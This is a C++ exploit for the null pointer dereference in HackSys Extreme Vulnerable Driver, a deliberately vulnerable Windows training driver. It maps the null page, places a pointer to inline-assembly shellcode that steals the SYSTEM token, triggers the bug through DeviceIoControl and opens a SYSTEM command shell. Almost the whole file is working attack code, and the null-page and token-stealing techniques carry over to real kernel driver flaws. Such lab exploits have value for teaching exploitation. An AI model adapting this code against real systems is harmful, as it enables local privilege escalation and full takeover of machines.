// HackSysNullPointerDeref.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>
#include <conio.h>

/* for ntAllocateVirtualMemory so we can map a null page */
typedef NTSTATUS (WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

//Taken from HackSsysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

/* We Define the offsets we need for our shellcode here */
#define KTHREAD_OFFSET 0x124   //kpcr.prcbdata.currentThread
#define EPROCESS_OFFSET 0x050  //kthread.apcstate.kprocess
#define PROC_LINK_OFFSET 0x0b8 //eprocess.activeProcessLinks
#define TOKEN_OFFSET 0x0f8	   //eprocess.token
#define PID_OFFSET 0x0b4	   //eprocess.pid
#define SYSTEM_PID 0x004	   //pid associated with SYSTEM

void tokenStealingShellcode()
{
	__asm
	{
		; initialize - step 1
		pushad; save registers state

		; steps 2 - 4
		mov eax, fs:[KTHREAD_OFFSET]; get the current thread pointer
		mov eax, [eax + EPROCESS_OFFSET]; get a pointer to the current process struct

		mov ecx, eax; copy the current eprocess struct we will need this later

		mov ebx, [eax + TOKEN_OFFSET]; put the current token in ebx
		mov edx, SYSTEM_PID

		; loop over the active processes looking for a system process
		SystemProcLoop :
		mov eax, [eax + PROC_LINK_OFFSET]
		sub eax, PROC_LINK_OFFSET; go to next process
		cmp edx, [eax + PID_OFFSET]; compare the pid with 0x004
		jne SystemProcLoop


		; at this point we should have a process with pid 4
		; so we can steal its token
		mov ebx, [eax + TOKEN_OFFSET]
		mov[ecx + TOKEN_OFFSET], ebx; copy the system token



		; recover gracefully
		popad
	}
}

int main()
{
	/* Common Variables */
	HANDLE hHandle = NULL;
	ULONG userValue = 0xBAADF00D;
	DWORD bytesReturned;
	DWORD userBufferSize = 4;

	/* Variables for Null page */
	PVOID base = (PVOID)0x1; 
	SIZE_T size = 0xff;
	
	hHandle = CreateFile(DEVICE_NAME,							//driver name
						 GENERIC_READ | GENERIC_WRITE,
						 FILE_SHARE_READ | FILE_SHARE_WRITE,
						 NULL,
						 OPEN_EXISTING,
						 FILE_ATTRIBUTE_NORMAL,
						 NULL
						);
	if (hHandle == INVALID_HANDLE_VALUE)
	{
		printf("[!] Failed to get Handle [!]\r\n");
		exit(-1);
	}

	printf("[+] Got handle 0x%0x [+]\r\n", hHandle);
	printf("[+] Loading ntdll and mapping null page [+]\r\n");

	//get a handle to ntdll so we can get the address of ntAllocateVirtualMemory
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");

	if (ntdll == INVALID_HANDLE_VALUE)
	{
		printf("[-] Could not get handle to ntdll [-]\r\n");
		CloseHandle(hHandle);
		exit(-1);
	}
	
	//Get the address of ntAllocateVirtualMemory
	FARPROC addr = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)addr;

	//Check for Null so we dont pwn ourselves 
	if (!NtAllocateVirtualMemory)
	{
		printf("[!] Failed to get address of NtAllocateVirtualMemory [!]\r\n");
		CloseHandle(hHandle);
		FreeLibrary(ntdll);
	}

	NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(),
		&base,
		0,
		&size,
		MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE //all access
	);

	if (status != 0)
	{
		printf("[!] Could not map null page [!]\r\n");
		CloseHandle(hHandle);
		FreeLibrary(ntdll);
		exit(-1);
	}

	/* Now the memory has been mapped, we can have it point to our shellcode */
	PVOID shellcode = (PVOID)((ULONG)0x4);
	*(PULONG)shellcode = (ULONG)&tokenStealingShellcode;

	printf("[+] Base address allocated at 0x%p [+]\r\n", base);
	printf("[+] Value 0x%p [+]\r\n", *(PUCHAR)shellcode);
	
	DeviceIoControl(hHandle,
					HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
					(LPVOID)&userValue,
					0,	  //passing a value by address
					NULL, //no output buffer
					0,	  //output buffer size
					&bytesReturned,
					NULL  //no Overlap.
					);

  //spawn system shell and wait
	system("cmd.exe");
	_getch();

	CloseHandle(hHandle);
    return 0;
}

